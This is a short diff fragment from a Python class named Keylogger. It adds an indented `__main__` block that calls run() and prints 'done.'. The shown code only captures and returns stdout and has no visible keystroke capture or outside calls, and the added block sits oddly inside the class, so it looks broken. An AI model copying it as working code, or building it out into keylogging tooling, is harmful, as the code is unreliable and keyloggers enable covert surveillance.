@@ -85,4 +85,8 @@ class Keylogger:
         log = sys.stdout.getvalue()
         sys.stdout = save_stdout
         return log
+
+    if __name__ == "__main__":
+        print(run())
+        print('done.')
     
